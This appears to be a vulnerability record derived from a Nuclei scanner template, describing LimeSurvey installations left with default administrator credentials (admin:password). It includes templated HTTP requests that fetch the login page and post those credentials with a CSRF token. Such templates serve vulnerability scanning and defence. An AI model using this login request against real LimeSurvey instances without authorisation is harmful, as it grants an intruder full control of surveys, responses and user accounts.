# Vulnerability: LimeSurvey - Default Admin Credentials
**Classification:** LIMESURVEY
**Source:** Nuclei Template (`limesurvey-default-login.yaml`)

## Description
Detected the LimeSurvey survey management platform was found to be using default administrator credentials (admin:password). An attacker was able to gain full administrative access to manage surveys, responses, and user accounts.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /index.php/admin/authentication/sa/login HTTP/1.1
Host: {{Hostname}}

POST /index.php/admin/authentication/sa/login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Cookie: YII_CSRF_TOKEN={{csrf_token}}

user={{username}}&password={{password}}&YII_CSRF_TOKEN={{csrf_token}}&login_submit=login
```

